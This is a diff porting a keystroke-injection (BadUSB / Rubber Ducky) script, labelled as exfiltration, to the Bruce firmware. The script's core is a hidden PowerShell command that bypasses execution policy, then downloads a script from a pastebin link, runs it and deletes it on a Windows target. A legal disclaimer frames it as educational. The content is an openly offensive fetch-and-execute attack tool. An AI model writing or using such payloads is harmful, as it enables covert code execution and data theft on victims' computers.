@@ -5,8 +5,11 @@ REM Target: Windows 10/11 (Powershell)
 REM Version: 1.0
 REM Category: Exfiltration
 REM Legal: This script is for educational purposes only. This script is authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. This author claims no responsibility for unauthorized or unlawful use.
+REM [Bruce compat rewrite]: ATTACKMODE HID / ATTACKMODE OFF removed —
+REM Bruce's ducky_typer.cpp has no ATTACKMODE support, it is always a
+REM plain HID keyboard, so these lines were a no-op for Bruce anyway.
+REM STRINGLN converted to STRING+ENTER.
 
-ATTACKMODE HID
 REM Inital Delay
 DELAY 500
 
@@ -20,9 +23,9 @@ REM Upload your ex.ps1 payload to pastebin or dropbox (or another website, if yo
 REM if you're using dropbox ensure the link ends with ?dl=1 and not ?dl=0
 REM if you're using pastebin ensure you're using the "raw" link e.g. http://pastebin.com/raw/<paste_id>
 REM                                                                         --------- replace me! ----------
-STRINGLN powershell -w h -NoP -NonI -Exec Bypass "$e=$env:TMP+'\ex.ps1';iwr https://pastebin.com/raw/<paste_id> -O $e;iex $e;rm $e"
+STRING powershell -w h -NoP -NonI -Exec Bypass "$e=$env:TMP+'\ex.ps1';iwr https://pastebin.com/raw/<paste_id> -O $e;iex $e;rm $e"
+ENTER
 DELAY 200
 
 REM Presses CAPSLOCK to indicate that payload is finished and you can remove the Ducky
 CAPSLOCK
-ATTACKMODE OFF
